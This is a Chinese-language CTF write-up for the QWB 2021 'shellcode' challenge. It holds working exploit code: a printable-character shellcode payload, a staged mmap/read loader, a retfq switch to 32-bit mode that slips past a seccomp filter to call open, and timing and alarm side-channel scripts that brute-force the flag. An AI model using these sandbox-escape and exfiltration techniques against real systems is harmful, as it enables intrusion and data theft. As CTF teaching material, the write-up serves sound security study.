---
title: qwb2021_shellcode
date: 2021-08-25 15:00:51
permalink: /pages/07df2e/
categories:
  - ctf_wp
  - qwb
tags:
  - 
---
#  qwb2021_shellcode 

[[toc]]

挺有趣的题目, 主要考察shellcode,  有点缝合怪的题目, 主要考点的话:

* shellcode 拓展
* 全字符shellcode
* 32/64位切换
* 无write函数测信道爆破

## 逆向

应该是汇编写成的一个程序, 只有一个start函数, 主要代码如下:

读取一段shellcode, 然后检测要为可见字符, 然后运行shellcode 

![image-20210825150601209](https://i.loli.net/2021/08/25/FpUvwm7YbEXOqIx.png)

通过sys_prctl设置了沙盒, 我们看下他的限制:

flag相关的只留了一个read, 

![image-20210825150715679](https://i.loli.net/2021/08/25/MLlS4h7xWXtfKvN.png)

可以看到对构架和系统调用号都没有check,  可以通过retftq切换到32位,

## 字符shellcode拓展

首先先过第一部分,  字符shellcode的限制, 这里使用[TaQini师傅改的alpha3](https://github.com/TaQini/alpha3), 

首先写一个大概的模板, 然后写入第一段shellcode即可, 

```python 
from pwn import * 
context.arch='amd64'

def f(sc):
	return asm(sc, os='linux', arch='amd64')

# read(0, 0x40404040, 0x1010) ax=3
read = f('''
''')

sh = read

fo = open("shellcode", "wb")
fo.write(sh)
fo.close()

```

这里因为我们要再读取一段shellcode进来, 但是没有啥地址, 于是我先mmap 获取一块地址, 然后read进来新的shellcode, 

```pyhton
# read(0, 0x40404040, 0x1010) ax=3
read = f('''
mov rsi, 0x40404040;
pushw 0x1010;
pop rdx;
xor rdi, rdi;
push 0x3;
pop rax;
syscall;
''')
print("read: ", read)

# mmap(0x40404040, 0xff, 7, 34, 0, 0) ax=9
mmap = f('''
mov rdi, 0x40404040;
push 0x7f;
pop rsi;
push 7;
pop rdx;
push 34;
pop rcx;
xor r8, r8;
xor r9, r9;
push 9;
pop rax;
syscall;
''')
print("mmap: ", mmap)

sh = mmap + read 
```

## 使用32位的系统调用

因为要先打开flag然后读取,  这里我们需要一个open, 看下系统调用号:

```
x64    syscall_number  x86
fstat       5           open 
alarm       37          kill
read        0           restart_syscall      
mmap        9           link
exit_group  231         fgetxattr
```

我们切换到32位模式会有一个open函数,于是我们在前面read结束以后, 使用retfq, 然后再retfq回来, 

关于这个指令: 从栈中弹出ip和cs, 通过控制cs可以控制是32位还是64位, 

跳转到64位: cs=0x33, 跳转到32位: cs=0x23, 

于是我们直接跳过去, 遇到的问题有两个, 

一是当前要运行的汇编代码不正确, 这是因为我输入了一堆'a', 后续写入shellcode即可, 

二是栈空间出错, 原本是`rsp = 0x7fffe1161a3e`但是32位变成`esp = 0xe1161a4e` , 所以我们要先调整一下rsp即可, 

![image-20210825175516680](https://i.loli.net/2021/08/25/OqeDF2UkG3yAgsE.png)

修改后第一段shellcode:

```python
# read(0, 0x40404040, 0x1010) ax=0
read = f('''
mov rsi, 0x40404040;
pushw 0x1010;
pop rdx;
xor rdi, rdi;
xor rax, rax;
syscall;
''')
print("read: ", read)

# mmap(0x40404040, 0xff, 7, 34, 0, 0) ax=9
mmap = f('''
mov rdi, 0x40404040;
push 0x7f;
pop rsi;
push 7;
pop rdx;
push 34;
pop rcx;
xor r8, r8;
xor r9, r9;
push 9;
pop rax;
syscall;
''')
print("mmap: ", mmap)

rsp = f('''
mov rsp, 0x40404f40
''')
print("rsp", rsp)

to32 = f('''
push 0x23;
push 0x40404040;
retfq
''')
print("to32", to32)

sh = mmap + read + rsp + to32
```

进入32位模式,  使用open, 但是read仍然在64位, 于是再切回去, 

而且这一次输入shellcode已经没有限制了, 于是可以直接shellcraft生成, 先打开文件,  然后retfq回到64位, 

这个回到64位以后的地址需要斟酌下,  32位没有办法构造输入, 那么sc2应该是:

```
sc2 = openflag + to64 + readflag  + ...
```

我们调试确定一下to64这一段中retfq的返回ip地址, 

![image-20210825182116194](https://i.loli.net/2021/08/25/rbLcgQqJAZh72fs.png)

成功读取到flag, 由于没有write, 下一步就是使用测信道思路, 通过时间爆破flag, 

目前的sc2部分:

```python

def exp():
	payload1 = "Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M153f3b0s2F0s2B0Z2l0l2L072I0X1P0i2w134l1M1m3k2F090o7m0L0x5o3g2p0p2I0r2q0Y2C2D060y1L8N2E124k7m0C0x3n3d2O0x2M0p2F2s2p0u2O0s2G0z5K00"
	gdb.attach(cn, cmd)
	sl(payload1)
	pause()

	openflag = asm32(shellcraft.i386.linux.open("./flag"))
	ret264 = asm32('''
		push 0x33; 
		push 0x40404065;
		// retfq;
		''') + b"H\xcb"
	readflag = asm64(shellcraft.amd64.linux.read(3, 0x40404840, 0x100))
	check = b'' 
	sc2 = openflag + ret264 + readflag + check
	sl(sc2)
```

## 测信道时间爆破flag

这一段思路就是cmp和jz, 如果这一位比较成功, 则死循环, 证明爆破成功, 

这样可以一个个字符爆破出来,

```python
def exp(reloc, ch):
	if reloc == 0:
	    shellcode = "cmp byte ptr[rsp+{0}], {1}; jz $-4; ret".format(reloc, ord(ch))
	else:
	    shellcode = "cmp byte ptr[rsp+{0}], {1}; jz $-5; ret".format(reloc, ord(ch))
	check = asm(shellcode, arch='amd64', os='linux')
```

爆破部分编写:

```python
flag = []
idx = 0
while True:
	for ch in range(32, 127):
		cn = process("./bin")
		exp(idx, ch)
		start = time.time()
		try:
			cn.recv(timeout=2)
		except:
			...
		cn.close()
		end = time.time()
		if end - start > 1.5:
			flag.append(ch)
			print(bytes(flag))
			break;
	else:
		print(bytes(flag))
		break
	idx += 1
```

得到flag:

![image-20210825214314835](https://i.loli.net/2021/08/25/XOCmEgbnoP5M4vZ.png)

## alarm时间获取flag 

比较有趣的思路, 复现来自[赤道企鹅师傅的wp](https://eqqie.cn/index.php/archives/1662),  

思路就是通过alarm系统调用设置时钟, 参数是读取进来的flag的某一位,  脚本中获取到这个等待时间就是flag, 

```python

openflag = asm32(shellcraft.i386.linux.open("./flag"))
ret264 = asm32('''
	push 0x33; 
	push 0x40404065;
	// retfq;
	''') + b"H\xcb"
readflag = asm64(shellcraft.amd64.linux.read(3, 'rsp', 0x100))

def exp(idx):
	cn = process("./bin")
	payload1 = b"Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M153f3b0s2F0s2B0Z2l0l2L072I0X1P0i2w134l1M1m3k2F090o7m0L0x5o3g2p0p2I0r2q0Y2C2D060y1L8N2E124k7m0C0x3n3d2O0x2M0p2F2s2p0u2O0s2G0z5K00"
	
	# gdb.attach(cn, cmd)
	cn.sendline(payload1)
	# pause()

	alarm = asm64('''
		xor rax, rax;
		mov al, byte ptr[rsp+{}];
		mov rdi, rax;
		sub rdi, 0x20;
		push 37;
		pop rax;
		syscall;
		jmp $;
		'''.format(idx))

	sc2 = openflag + ret264 + readflag + alarm
	start = time.time()
	cn.sendline(sc2)
	try:
		cn.recv()
	except:
		...
	end = time.time()
	cn.close()
	pass_time = int(end-start) + 0x20
	flag[idx] = pass_time
	print(bytes(flag))


context.os='linux'

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw']

pool = []
flag = [0]*0x20
for i in range(0x20):
	t = threading.Thread(target=exp, args=(i, ))
	pool.append(t)
	t.start()
for i in pool:
	t.join()
print(bytes(flag))

```

![image-20210825223312538](https://i.loli.net/2021/08/25/SYVwsGWyNZ7gEup.png)

